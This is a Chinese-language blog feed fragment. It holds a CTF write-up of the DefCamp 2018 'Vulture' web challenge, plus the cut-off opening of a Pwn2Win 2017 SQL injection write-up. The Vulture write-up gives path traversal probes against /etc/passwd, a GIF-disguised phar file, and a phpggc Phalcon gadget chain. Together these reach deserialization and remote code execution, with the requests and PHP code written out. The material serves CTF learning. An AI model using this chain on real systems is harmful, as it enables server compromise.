+&lt;/ul&gt;</description></item><item><title>DefCamp CTF Qualification 2018: Vulture Write-up</title><link>https://cyku.tw/blog/ctf-defcamp-qualification-2018/</link><pubDate>Mon, 24 Sep 2018 16:31:30 +0800</pubDate><guid>https://cyku.tw/blog/ctf-defcamp-qualification-2018/</guid><description>
+&lt;p&gt;Vulture 是一道出現在 DefCamp CTF Qualification 2018 屬於 Web 類型的題目。這題很有趣，雖然是黑箱但不用通靈、猜謎，整道題可以透過各種蛛絲馬跡有邏輯性地推敲並串出完整漏洞利用來解題。&lt;/p&gt;
+&lt;p&gt;題目敘述如下：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;We created an online service where you can upload pictures of vultures (or other birds). Each user has a feed so you can privately enjoy the photos you took of this majestic killing machines :)
+Target: https://vulture.dctfq18.def.camp/
+Author: Anatol&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;點進網頁後，右上方可以發現有個 Login 按鈕，但沒有 Register 按鈕，點 Login 進入到登入表單的頁面時注意到網址是 /auth/login，那直接修改成 /auth/register 就會跳出註冊表單了。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;登入：&lt;a href="https://vulture.dctfq18.def.camp/auth/login"target="_blank" rel="noopener"&gt;https://vulture.dctfq18.def.camp/auth/login&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;註冊：&lt;a href="https://vulture.dctfq18.def.camp/auth/register"target="_blank" rel="noopener"&gt;https://vulture.dctfq18.def.camp/auth/register&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;登入後發現服務就如敘述般單純，可以上傳圖片加簡單文字敘述，上傳後的圖片都會被條列在 /feed 頁面上。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2018/09/defcamp_ctf_2018_vulture_01.png" alt="defcamp_ctf_2018_vulture_01" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;最初當然是要對服務進行一些資訊收集，過程中發現一個有趣的現象，當請求不存在的路徑(例如：/asd)時，伺服器會有如以下的反應：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;GET /asd HTTP/1.1
+Host: vulture.dctfq18.def.camp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 OK
+Date: Mon, 24 Sep 2018 06:48:23 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 55
+Connection: keep-alive
+Server: CoffeeHackingMachine 13.37
+X-XSS-Protection: 1; mode=block
+Strict-Transport-Security: max-age=31536000
+X-Frame-Options: sameorigin
+X-Content-Type-Options: nosniff
+Exception: AsdController handler class cannot be loaded&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;所以上面的 Exception 資訊透露出甚麼？如果將那串 Exception 訊息丟上 Google Search 可以發現，這個訊息是因為一套名為 &lt;a href="https://en.wikipedia.org/wiki/Phalcon_%28framework%29"target="_blank" rel="noopener"&gt;Phalcon&lt;/a&gt; 的 PHP framework 找不到相對應負責處理該路徑請求的 class 所噴出來的錯誤，所以表示這個網站應該就是由 Phalcon 撰寫而成。&lt;/p&gt;
+&lt;p&gt;首先對上傳圖片的部分進行一些 fuzz，上傳的流程是經過 POST /feed/upload 將圖片上傳至伺服器上，伺服器再回傳檔案的網址路徑，結果是感覺機會不大，因為會先嚴格檢查副檔名，取副檔名後加上流水號的主檔名作為上傳後的完整檔名，並且還會檢查二進制內容是否有以允許的任一種圖片類型的 Magic Number 開頭，譬如 GIF 的 GIF87a 就是白名單之一。&lt;/p&gt;
+&lt;p&gt;這就是一個上傳成功的圖片網址：&lt;br&gt;
+&lt;a href="https://vulture.dctfq18.def.camp/uploads/5ba7c28447e19.png"target="_blank" rel="noopener"&gt;https://vulture.dctfq18.def.camp/uploads/5ba7c28447e19.png&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;接著對 /feed 新增的部分開始作 fuzz，因為題目敘述中有提及「you can &lt;strong&gt;privately&lt;/strong&gt; enjoy the photos」，雖然說明是 privately，但難以保證不會有小精靈在偷看你上傳的所有圖片，於是我就順手測試一下是否有 XSS 的可能性。&lt;/p&gt;
+&lt;p&gt;對 /feed 新增的 API 請求如下：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;POST /feed HTTP/1.1
+Host: vulture.dctfq18.def.camp
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 89
+Cookie: PHPSESSID=bips9g67d33adc7ptrur9f03e2
+image=uploads/5ba7c28447e19.png&amp;amp;text=description&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;測試結果是過濾得很好，應該是不會有要打 XSS 的可能性。除了排除掉一個思考方向以外，還發現一個有趣的特性，假如 image 給一個不存在的圖片路徑，發出 POST 請求後回到 /feed 頁面會多出一個提示訊息：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;#34;alert alert-danger&amp;#34; role=&amp;#34;alert&amp;#34;&amp;gt;
+Image not found
+&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;根據這個訊息，直覺認為繼續在 image 參數挖掘下去應該有很大的機會，所以就繼續針對這個參數作了一連串 fuzz，發現有一下幾種關鍵的反應：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;image&lt;/th&gt;
+&lt;th&gt;新增成功/失敗&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;./uploads/5ba7c28447e19.png&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;成功&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;../uploads/5ba7c28447e19.png&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;失敗&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;uploads/./5ba7c28447e19.png&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;成功&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;uploads/../5ba7c28447e19.png&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;失敗&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;uploads/5ba7c28447e19.png#sasad&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;失敗&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;uploads/aaaa/../5ba7c28447e19.png&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;失敗&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;../../../../../../etc/passwd&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;成功&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href="https://vulture.dctfq18.def.camp/uploads/5ba7c28447e19.png"target="_blank" rel="noopener"&gt;https://vulture.dctfq18.def.camp/uploads/5ba7c28447e19.png&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;失敗&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;file:///etc/passwd&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;失敗&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;一開始有在猜想打 SSRF 的可能性，但最後 5 條測試結果封掉了這條路。測試完看起來是存在 file system 上 Path Traversal 的問題，其中一條 &lt;code&gt;uploads/aaaa/../5ba7c28447e19.png&lt;/code&gt; 讓我特別感興趣，因為這個結果是 Linux file system 的行為導致，在 Linux 下即使你後方有 &lt;code&gt;../&lt;/code&gt; 但前方的路徑是一個不存在的資料夾，file system 還是會返回 &lt;code&gt;No such file or directory&lt;/code&gt;，可以自行在自己的主機上測試指令 &lt;code&gt;ls -la /etc/aaaa/../&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;綜合以上的測試結果，可以猜想伺服器端可能是透過 PHP 中類似 file_exists 的函數對檔案存在進行檢查。&lt;/p&gt;
+&lt;p&gt;這邊要提到一件有趣的事實，若使用的是 PHP file_exists 函數，這個函數可以接受使用 phar:// Stream Wrapper，在 Seebug Paper 中有一篇文章 &lt;a href="https://paper.seebug.org/680/#22-demo"target="_blank" rel="noopener"&gt;利用 phar 拓展 php 反序列化漏洞攻击面&lt;/a&gt; 中就有替我們測試並整理出 PHP 中可以接受 phar:// 的所有 file system 相關函數。&lt;/p&gt;
+&lt;p&gt;嘗試生成一個 phar 檔案，利用上傳圖片功能上傳至伺服器上，這邊必須用 setStub 添加 &lt;code&gt;GIF89a&lt;/code&gt; 在 phar 檔案的開頭，才能通過最前面上傳圖片時的檢查限制。&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;@&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;unlink&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;phar.phar&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$p &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Phar&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;phar.phar&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$p&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;startBuffering&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$p&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;setStub&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;GIF89a&amp;lt;?php xxx; __HALT_COMPILER();?&amp;gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$p&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;addFromString&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;test.txt&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;test&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$p&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;stopBuffering&lt;/span&gt;();&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;上傳成功後嘗試在 /feed 進行新增，不同的是 image 改使用 phar:// 去引入上傳的 gif 檔案，結果是在 /feed 新增成功！&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;POST /feed HTTP/1.1
+Host: vulture.dctfq18.def.camp
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+Cookie: PHPSESSID=bips9g67d33adc7ptrur9f03e2
+image=phar://uploads/5ba897805da92.gif/test.txt&amp;amp;text=asdasd&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;現在我們可以使用 phar:// 去引入檔案，然後呢？接續剛剛的事實，PHP 的 Phar 物件有個方法叫做 &lt;a href="http://php.net/manual/en/phar.setmetadata.php"target="_blank" rel="noopener"&gt;setMetadata&lt;/a&gt;，他可以在產生出的 phar 檔案中塞入一個 PHP 物件序列化後的資料，這個序列化的資料會在下次使用 phar:// 去引入 phar 檔案時被反序列化，這個事實在我知道的範圍內，最早是在 HITCON 2017 Quals 中的一道由 Orange 所出的 Web 題目 &lt;a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017"target="_blank" rel="noopener"&gt;Baby^H Master PHP 2017&lt;/a&gt; 出現的利用。&lt;/p&gt;
+&lt;p&gt;終於我們有了一個 blind unserialize 漏洞，可是又該如何利用？記得先前 fuzz 有發現後端是使用 Phalcon framework 撰寫的嗎？有一個開源的專案叫做 &lt;a href="https://github.com/ambionics/phpggc"target="_blank" rel="noopener"&gt;phpggc&lt;/a&gt;，裡面收集了一些常見 PHP framework 的通用 unserialize gadget chain，其中一項就是：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;NAME VERSION TYPE VECTOR I
+Phalcon/RCE1 &amp;lt;= 1.2.2 rce __wakeup *&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;總之先打下去再說！我個人比較偷懶，所以直接修改 &lt;code&gt;phpggc/gadgetchains/Phalcon/RCE/1/chain.php&lt;/code&gt; 這個檔案，在 generate 函數裡把產出的 gadget chain 的物件包進 Phar 寫進一個 phar.phar 檔案裡頭。&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;public function generate(array $parameters)
+{
+@unlink(&amp;#39;phar.phar&amp;#39;);
+$p = new Phar(&amp;#39;phar.phar&amp;#39;);
+$p-&amp;gt;startBuffering();
+$p-&amp;gt;setStub(&amp;#34;GIF89a&amp;lt;?php xxx; __HALT_COMPILER();?&amp;gt;&amp;#34;);
+$p-&amp;gt;addFromString(&amp;#34;test.txt&amp;#34;, &amp;#34;test&amp;#34;);
+$p-&amp;gt;setMetadata(new \Phalcon\Logger\Adapter\File());
+$p-&amp;gt;stopBuffering();
+return new \Phalcon\Logger\Adapter\File();
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;生成好 phar.phar 改副檔名為 gif 丟上伺服器，再用 phar:// 引入。嗯？好像有奇怪的訊息跑出來了。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2018/09/defcamp_ctf_2018_vulture_02.png" alt="defcamp_ctf_2018_vulture_02" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;可以看一下 phpggc 的 &lt;a href="https://github.com/ambionics/phpggc/blob/master/gadgetchains/Phalcon/RCE/1/gadgets.php"target="_blank" rel="noopener"&gt;Phalcon RCE gadget chain&lt;/a&gt; 是如何串的，看起來是會進到一個 &lt;code&gt;\Phalcon\Mvc\View\Engine\Php&lt;/code&gt; 的 class，再走到裡面有一行 &lt;a href="https://github.com/phalcon/cphalcon/blob/master/phalcon/mvc/view/engine/php.zep#L55"target="_blank" rel="noopener"&gt;&lt;code&gt;require path;&lt;/code&gt;&lt;/a&gt;，而 phpggc 提供的 gadget 會代入 &lt;code&gt;php://input&lt;/code&gt; 的值給 path 參數。&lt;/p&gt;
+&lt;p&gt;所以只要在 POST Body 上寫入 PHP Code，就能順利 RCE 了！&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2018/09/defcamp_ctf_2018_vulture_03.png" alt="defcamp_ctf_2018_vulture_03" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;最後的 flag！&lt;br&gt;
+&lt;img src="https://cyku.tw/images/2018/09/defcamp_ctf_2018_vulture_04.png" alt="defcamp_ctf_2018_vulture_04" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;DCTF{fe2361512d671c3770c35c24f122a5d9cc3b5c43884058cb87942336e07c7f86}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description></item><item><title>Pwn2Win 2017 Write-up: Web - Criminals</title><link>https://cyku.tw/blog/pwn2win-ctf-2017-write-up-web-criminals/</link><pubDate>Wed, 25 Oct 2017 21:11:10 +0800</pubDate><guid>https://cyku.tw/blog/pwn2win-ctf-2017-write-up-web-criminals/</guid><description>
+&lt;p&gt;最終解開這道題目時，發現其實並不困難，但因作者我還是個菜雞，且對這道題目的服務所使用的工具完全沒接觸過，過程中繞了許多圈子、走了許多歪路，不過也累積了不少有用的經驗，於是就來為這道題目寫篇 Write-up，同時也詳細記錄下我所走的各種歪路 (´; ω ;`)&lt;/p&gt;
+&lt;p&gt;原始的題目說明很單純：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;h4&gt;Criminals&lt;span class="hx:absolute hx:-mt-20" id="criminals"&gt;&lt;/span&gt;
+&lt;a href="#criminals" class="subheading-anchor" aria-label="此章節的永久連結"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Hey, Rebellious member, let&amp;rsquo;s hack this Bloodsuckers web app. I think they keep some secret.
+點開網頁應用程式的連結，也是一個很單純的搜尋頁面：&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2017/10/pwn2win-ctf-2017-write-up-web-criminals-1.png" alt="" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;簡單嘗試一下 /robots.txt、/.git/、/.svn/ 等路徑，發現都是 404 的結果，再配合題目敘述，推測可能是要打 SQL Injection。&lt;/p&gt;
+&lt;p&gt;嘗試 Fuzzing 所有的欄位，直接全部輸入一些奇怪符號「aaa&amp;rsquo;&amp;quot;&amp;rsquo;#,」，順利噴出一連串錯誤訊息，並且發現 Order 欄位是 Injectable 的。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2017/10/pwn2win-ctf-2017-write-up-web-criminals-2.png" alt="" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
